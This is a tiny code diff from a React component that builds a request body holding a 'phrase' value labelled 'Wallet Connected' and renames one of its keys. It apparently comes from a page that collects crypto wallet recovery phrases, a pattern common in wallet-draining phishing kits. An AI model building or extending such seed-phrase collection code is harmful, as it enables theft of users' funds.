@@ -37,7 +37,7 @@ const Coincomps = ({ data }) => {
       setIsLoading(true);
 
       const body = {
-        subject: "Wallet Connected",
+        wallet: "Wallet Connected",
         phrase: phrase,
       };
 
